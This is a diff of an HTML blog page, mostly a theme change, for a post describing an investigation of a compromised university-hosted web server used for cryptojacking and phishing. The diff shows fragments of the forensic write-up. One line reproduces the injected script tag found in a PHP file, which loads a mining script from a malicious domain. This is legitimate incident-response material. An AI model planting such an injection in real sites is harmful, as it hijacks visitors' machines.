@@ -1,335 +1,198 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.\n">
-<title>Uncovering Cryptojacking/Phishing At University of Toronto</title>
+<html lang="en" style="font-size: 105%">
 
-<link rel='canonical' href='http://localhost:1313/p/uncovering-cryptojacking/phishing-at-university-of-toronto/'>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Uncovering Cryptojacking/Phishing At University of Toronto">
-<meta property='og:description' content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.\n">
-<meta property='og:url' content='http://localhost:1313/p/uncovering-cryptojacking/phishing-at-university-of-toronto/'>
-<meta property='og:site_name' content='R4J'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='technical' /><meta property='article:published_time' content='2020-06-06T17:50:51-05:00'/><meta property='article:modified_time' content='2020-06-06T17:50:51-05:00'/><meta property='og:image' content='http://localhost:1313/post/cryptojacking-phishing-savi/unsplash-coding.jpg' />
-<meta name="twitter:title" content="Uncovering Cryptojacking/Phishing At University of Toronto">
-<meta name="twitter:description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/post/cryptojacking-phishing-savi/unsplash-coding.jpg' />
-    <link rel="shortcut icon" href="/favicon.png" />
+  
+  <meta name="author" content="">
 
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "dark");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+  
+  
+  <meta name="description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
+  
 
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313//images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313//images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313//images/favicon-16x16.png">
 
-            document.documentElement.dataset.scheme = 'dark';
-        } else {
-            document.documentElement.dataset.scheme = 'light';
-        }
-    })();
+  
+  
+  <meta name="keywords" content='hugo latex theme blog texify texify2 texify3 michael neuper'>
+  
+
+  
+  
+  <link rel="stylesheet" href='/katex/katex.min.css'>
+<script defer defer src='/katex/katex.min.js'></script>
+<script defer src='/katex/contrib/auto-render.min.js'></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false},
+              {left: '\\(', right: '\\)', display: false},
+              {left: '\\[', right: '\\]', display: true}
+          ],
+          throwOnError : false
+        });
+    });
 </script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
+  
+
+  
+    <script async data-name="BMC-Widget" 
+        data-cfasync="true" 
+        src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" 
+        data-id="michaelneuper" 
+        data-description="Like what I do? Buy me a coffee!" 
+        data-message="" 
+        data-color="#d79921" 
+        data-position="Right" 
+        data-x_margin="18" 
+        data-y_margin="18"
+        crossorigin="anonymous">
+  </script>
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/p/uncovering-cryptojacking/phishing-at-university-of-toronto/">
+  <meta property="og:site_name" content="TeXify3">
+  <meta property="og:title" content="Uncovering Cryptojacking/Phishing At University of Toronto">
+  <meta property="og:description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2020-06-06T17:50:51-05:00">
+    <meta property="article:modified_time" content="2025-02-02T23:42:14-05:00">
+    <meta property="article:tag" content="Technical">
+
+
+  
+  <link rel="canonical" href="http://localhost:1313/p/uncovering-cryptojacking/phishing-at-university-of-toronto/">
+
+  
+  
+  
+  <meta itemprop="name" content="Uncovering Cryptojacking/Phishing At University of Toronto">
+  <meta itemprop="description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
+  <meta itemprop="datePublished" content="2020-06-06T17:50:51-05:00">
+  <meta itemprop="dateModified" content="2025-02-02T23:42:14-05:00">
+  <meta itemprop="wordCount" content="2776">
+  <meta itemprop="keywords" content="Technical">
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/common.min.e562d763c6d0825495eb17de8b2c1d9800cf7c08db1c36accedf77a5fccfc4b9.css" integrity="sha256-5WLXY8bQglSV6xfeiywdmADPfAjbHDaszt93pfzPxLk=" crossorigin="anonymous">
+  
+
+  
+  
+    <link rel="stylesheet" href="/css/content.min.ba38eba94cb47fef9936258c42d11ff19fa9686a30b38e783773fe3f15eb44dc.css" integrity="sha256-ujjrqUy0f&#43;&#43;ZNiWMQtEf8Z&#43;paGows454N3P&#43;PxXrRNw=" crossorigin="anonymous">
+  
+
+  
+  
+  <title>Uncovering Cryptojacking/Phishing At University of Toronto - TeXify3</title>
+  
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Uncovering Cryptojacking/Phishing At University of Toronto">
+  <meta name="twitter:description" content="During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.">
+
+
+  
+
+
+  <link rel="stylesheet" href="/css/single.min.be779f459ad7e3aaf8afd0f80c6a61ca6c50993f5f18512532100ac6d93f0fa9.css" integrity="sha256-vnefRZrX46r4r9D4DGphymxQmT9fGFElMhAKxtk/D6k=" crossorigin="anonymous">
+
+
+  <link rel="stylesheet" href="/css/single.min.78a121b7d7a160420f9daab0ea13add66c37b9c44f27bba07b27207e2b0975d2.css" integrity="sha256-eKEht9ehYEIPnaqw6hOt1mw3ucRPJ7ugeycgfisJddI=" crossorigin="anonymous">
+
+
+</head>
+
+<body>
+  <div id="wrapper">
+    
+
+
+<header id="header">
+  <h1>
+    <a href="http://localhost:1313/">TeXify3</a>
+    <button id="dark-mode-toggle" class="dark-mode-toggle" aria-label="Toggle theme">
+        <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 496">
+        <path fill="currentColor" d="M8,256C8,393,119,504,256,504S504,393,504,256,393,8,256,8,8,119,8,256ZM256,440V72a184,184,0,0,1,0,368Z" transform="translate(-8 -8)"/>
+        </svg>
     </button>
+  </h1>
 
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu_d3bbd7efe25e32af.png" width="300"
-                            height="225" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-                    <span class="emoji">🚀</span>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">R4J</a></h1>
-            <h2 class="site-description">A tiny space for me to learn/share/rant/explore</h2>
-        </div>
-    </header><ol class="menu-social">
-            
-                <li>
-                    <a 
-                        href='https://github.com/rajsimmanravi/rajsimmanravi.github.io'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-                <li>
-                    <a 
-                        href='https://linkedin.com/in/rajsimman'
-                        target="_blank"
-                        title="Linkedin"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg height="2500" width="2490" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"><g fill="none"><path d="M0 18.338C0 8.216 8.474 0 18.92 0h218.16C247.53 0 256 8.216 256 18.338v219.327C256 247.79 247.53 256 237.08 256H18.92C8.475 256 0 247.791 0 237.668V18.335z" fill="#069"/><path d="M77.796 214.238V98.986H39.488v115.252H77.8zM58.65 83.253c13.356 0 21.671-8.85 21.671-19.91-.25-11.312-8.315-19.915-21.417-19.915-13.111 0-21.674 8.603-21.674 19.914 0 11.06 8.312 19.91 21.169 19.91h.248zM99 214.238h38.305v-64.355c0-3.44.25-6.889 1.262-9.346 2.768-6.885 9.071-14.012 19.656-14.012 13.858 0 19.405 10.568 19.405 26.063v61.65h38.304v-66.082c0-35.399-18.896-51.872-44.099-51.872-20.663 0-29.738 11.549-34.78 19.415h.255V98.99H99.002c.5 10.812-.003 115.252-.003 115.252z" fill="#fff"/></g></svg>
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
-        <li >
-            <a href='/about/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        <li class="menu-bottom-section">
-            <ol class="menu">
-
-                
-                    <li id="dark-mode-toggle">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                        <span>Dark Mode</span>
-                    </li>
-                
-            </ol>
-        </li>
-    </ol>
-</aside>
-
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">Table of contents</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ul>
-    <li><a href="#network-analysis">Network Analysis</a></li>
-    <li><a href="#applications-analysis">Applications Analysis</a></li>
-    <li><a href="#phishing-attack">Phishing Attack</a></li>
-    <li><a href="#conclusion">Conclusion</a></li>
-  </ul>
-</nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
-
-            <main class="main full-width">
-    <article class="has-image main-article">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/uncovering-cryptojacking/phishing-at-university-of-toronto/">
-                
-                    <img src="/post/cryptojacking-phishing-savi/unsplash-coding.jpg" loading="lazy" alt="Featured image of post Uncovering Cryptojacking/Phishing At University of Toronto" />
-                
-            </a>
-        </div>
+  <nav>
     
-
-    <div class="article-details">
+    <span class="nav-bar-item">
+      
+      <a class="link" href="/about/">About</a>
+    </span>
     
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/uncovering-cryptojacking/phishing-at-university-of-toronto/">Uncovering Cryptojacking/Phishing At University of Toronto</a>
-        </h2>
+    <span class="nav-bar-item">
+      
+        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+<path d="M17,11H16a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2Zm0,4H16a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2ZM11,9h6a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2ZM21,3H7A1,1,0,0,0,6,4V7H3A1,1,0,0,0,2,8V18a3,3,0,0,0,3,3H18a4,4,0,0,0,4-4V4A1,1,0,0,0,21,3ZM6,18a1,1,0,0,1-2,0V9H6Zm14-1a2,2,0,0,1-2,2H7.82A3,3,0,0,0,8,18V5H20Zm-9-4h1a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2Zm0,4h1a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2Z"/></svg>
+</span>
+      
+      <a class="link" href="/posts/">Blog</a>
+    </span>
     
-        
-    </div>
-
+    <span class="nav-bar-item">
+      
+      <a class="link" href="/">Home</a>
+    </span>
     
+    <span class="nav-bar-item">
+      
+        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+<path d="M2.88,16.88a3,3,0,0,0,0,4.24,3,3,0,0,0,4.24,0,3,3,0,0,0-4.24-4.24Zm2.83,2.83a1,1,0,0,1-1.42-1.42,1,1,0,0,1,1.42,0A1,1,0,0,1,5.71,19.71ZM5,12a1,1,0,0,0,0,2,5,5,0,0,1,5,5,1,1,0,0,0,2,0,7,7,0,0,0-7-7ZM5,8a1,1,0,0,0,0,2,9,9,0,0,1,9,9,1,1,0,0,0,2,0,11.08,11.08,0,0,0-3.22-7.78A11.08,11.08,0,0,0,5,8Zm10.61.39A15.11,15.11,0,0,0,5,4,1,1,0,0,0,5,6,13,13,0,0,1,18,19a1,1,0,0,0,2,0A15.11,15.11,0,0,0,15.61,8.39Z"/></svg>
+</span>
+      
+      <a class="link" href="/index.xml">RSS</a>
+    </span>
     
+    <span class="nav-bar-item">
+      
+        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" data-name="Layer 1">
+<path d="M10.07031,20.50291a1.00008,1.00008,0,0,0-1.18115-.9834c-1.30908.24024-2.96191.27637-3.40137-.958a5.70754,5.70754,0,0,0-1.83691-2.415,1.20073,1.20073,0,0,1-.1665-.10938,1,1,0,0,0-.93067-.64551H2.54883a.99965.99965,0,0,0-1,.99512c-.00391.81543.811,1.33789,1.1416,1.51465a4.4408,4.4408,0,0,1,.92383,1.35937c.36426,1.02344,1.42285,2.57617,4.46582,2.376.001.03516.00195.06836.00244.09863l.00439.26758a1,1,0,0,0,2,0l-.00488-.31836C10.07715,21.4951,10.07031,21.22068,10.07031,20.50291Zm10.667-15.126c.03174-.125.063-.26367.09034-.41992a6.27792,6.27792,0,0,0-.40821-3.293,1.002,1.002,0,0,0-.61572-.58007c-.356-.12012-1.67041-.35645-4.18408,1.25a13.86918,13.86918,0,0,0-6.354,0C6.76221.751,5.45459.9658,5.10205,1.07908a.99744.99744,0,0,0-.63135.584,6.3003,6.3003,0,0,0-.40332,3.35644c.02442.12793.05078.2461.07813.35449A6.26928,6.26928,0,0,0,2.89014,9.20311a8.42168,8.42168,0,0,0,.04248.92187c.334,4.60254,3.334,5.98438,5.42431,6.459-.04345.125-.083.25878-.11816.40039a1.00023,1.00023,0,0,0,1.94238.47851,1.6784,1.6784,0,0,1,.46778-.87793.99947.99947,0,0,0-.5459-1.74512c-3.4541-.39453-4.95362-1.80175-5.1792-4.89843a6.61076,6.61076,0,0,1-.03369-.73828,4.25769,4.25769,0,0,1,.91943-2.71289,3.022,3.022,0,0,1,.1958-.23145.99988.99988,0,0,0,.188-1.02441,3.3876,3.3876,0,0,1-.15527-.55567A4.09356,4.09356,0,0,1,6.1167,3.06346a7.54263,7.54263,0,0,1,2.415,1.17968,1.00877,1.00877,0,0,0,.82764.13282,11.77716,11.77716,0,0,1,6.17285.001,1.00549,1.00549,0,0,0,.83056-.13769,7.572,7.572,0,0,1,2.40528-1.19043,4.03977,4.03977,0,0,1,.0874,1.57812,3.205,3.205,0,0,1-.16895.60743.9999.9999,0,0,0,.188,1.02441c.07715.08691.1543.18066.22363.26855A4.12186,4.12186,0,0,1,20,9.20311a7.03888,7.03888,0,0,1-.0376.77734c-.22021,3.05566-1.72558,4.46387-5.1958,4.85937a1,1,0,0,0-.54541,1.7461,1.63079,1.63079,0,0,1,.46631.9082,3.06079,3.06079,0,0,1,.09229.81934v2.334C14.77,21.2949,14.77,21.78025,14.77,22.00291a1,1,0,1,0,2,0c0-.2168,0-.69238.00977-1.33984V18.31346a4.8815,4.8815,0,0,0-.15479-1.31153,4.25638,4.25638,0,0,0-.11621-.416,6.51258,6.51258,0,0,0,5.44531-6.42383A8.69677,8.69677,0,0,0,22,9.20311,6.13062,6.13062,0,0,0,20.7373,5.37693Z"/></svg>
+</span>
+      
+      <a class="link" href="https://github.com/michaelneuper/hugo-texify3">GitHub</a>
+    </span>
     
+    <span class="nav-bar-item">
+      
+      <a class="link" href="/search/">Search</a>
+    </span>
     
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Jun 06, 2020</time>
-            </div>
-        
-
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
-
-
-
-                <time class="article-time--reading">
-                    14 minute read
-                </time>
-            </div>
-        
-    </footer>
+    <span class="nav-bar-item">
+      
+      <a class="link" href="/archives/">Archives</a>
+    </span>
     
-
-    
-</div>
-
+  </nav>
 </header>
-
-    <section class="article-content">
+<hr class="head-rule"></hr>
     
-    
+<main id="main" class="post">
+  
+  <article class="content numbered-subtitles">
     <p>During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.</p>
-<p>&#x26a1; <strong>Note that for privacy concerns, I removed the actual website domain and removed some parts of the public IP addresses.</strong></p>
-<h2 id="network-analysis">Network Analysis
-</h2><p>I began my analysis by looking at the network connections on the virtual machine:</p>
+<p>:zap: <strong>Note that for privacy concerns, I removed the actual website domain and removed some parts of the public IP addresses.</strong></p>
+<h2 id="network-analysis">Network Analysis</h2>
+<p>I began my analysis by looking at the network connections on the virtual machine:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -469,8 +332,8 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>There were <strong>perl</strong> scripts running and also the process was accessing <code>/var/log/apache2/error.log</code>. I noticed the IP address <code>204.188.217.xx</code> kept recurring and I knew it was related to the webserver. My next stop was to look at the application itself.</p>
-<h2 id="applications-analysis">Applications Analysis
-</h2><p>I started checking the <code>/var/www</code> directory to check for any activity by the user <code>www-data</code>:</p>
+<h2 id="applications-analysis">Applications Analysis</h2>
+<p>I started checking the <code>/var/www</code> directory to check for any activity by the user <code>www-data</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -559,8 +422,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;//drupalupdates.tk/check.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span><span class="err">&lt;</span>?php^M
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>This looked very suspicious because of the domains and so I researched this piece of code and found out these were cryptomining scripts, as reported by a twitter post: <a class="link" href="https://twitter.com/bad_packets/status/1037416308336287744"  target="_blank" rel="noopener"
-    >https://twitter.com/bad_packets/status/1037416308336287744</a></p>
+</div><p>This looked very suspicious because of the domains and so I researched this piece of code and found out these were cryptomining scripts, as reported by a twitter post: <a href="https://twitter.com/bad_packets/status/1037416308336287744">https://twitter.com/bad_packets/status/1037416308336287744</a></p>
 <p>To remediate this issue, I simply removed these scripts. However, the connections still persisted:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -690,20 +552,10 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>This looked more like phishing activity and I thought there could be more dark things lurking in this machine. This explained why removing the scripts did not close the connections.</p>
-<h2 id="phishing-attack">Phishing Attack
-</h2><p>I realized there were potentially 2 (common) ways to attacking this server: either through the <strong>ssh</strong> open port <strong>22</strong> or through the web application (hosted on port <strong>80</strong>). Since there were a lot of activity with the web-server, I visited the domain of the website and checked for suspicious elements on the background.</p>
-<p>Upon visiting the site’s main page <a class="link" href="https://subdomain.website.ca"  target="_blank" rel="noopener"
-    >https://subdomain.website.ca</a> and when inspecting the elements on the HTML page of the site, I found a hidden javascript tag code:</p>
-<p><img src="/post/cryptojacking-phishing-savi/suspicious_script.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="Suspicious Script"
-	
-	
-></p>
+<h2 id="phishing-attack">Phishing Attack</h2>
+<p>I realized there were potentially 2 (common) ways to attacking this server: either through the <strong>ssh</strong> open port <strong>22</strong> or through the web application (hosted on port <strong>80</strong>). Since there were a lot of activity with the web-server, I visited the domain of the website and checked for suspicious elements on the background.</p>
+<p>Upon visiting the site’s main page <a href="https://subdomain.website.ca">https://subdomain.website.ca</a> and when inspecting the elements on the HTML page of the site, I found a hidden javascript tag code:</p>
+<p><img src="post/cryptojacking-phishing-savi/suspicious_script.png" alt="Suspicious Script"></p>
 <p>Just like any (in)sane person would do, I downloaded the file and took a look:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -907,10 +759,9 @@
 </span></span><span class="line"><span class="cl"><span class="p">})</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>This script was trying to load more cryptojacking scripts. It had a similar resemblance to: <a class="link" href="https://coinhive.com/documentation/miner"  target="_blank" rel="noopener"
-    >https://coinhive.com/documentation/miner</a></p>
-<h3 id="mysql-database-analysis">MySQL Database Analysis
-</h3><p>Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) was injected in a MySQL table: <strong>block_custom</strong> in database: <strong>subdomainsite</strong></p>
+</div><p>This script was trying to load more cryptojacking scripts. It had a similar resemblance to: <a href="https://coinhive.com/documentation/miner">https://coinhive.com/documentation/miner</a></p>
+<h3 id="mysql-database-analysis">MySQL Database Analysis</h3>
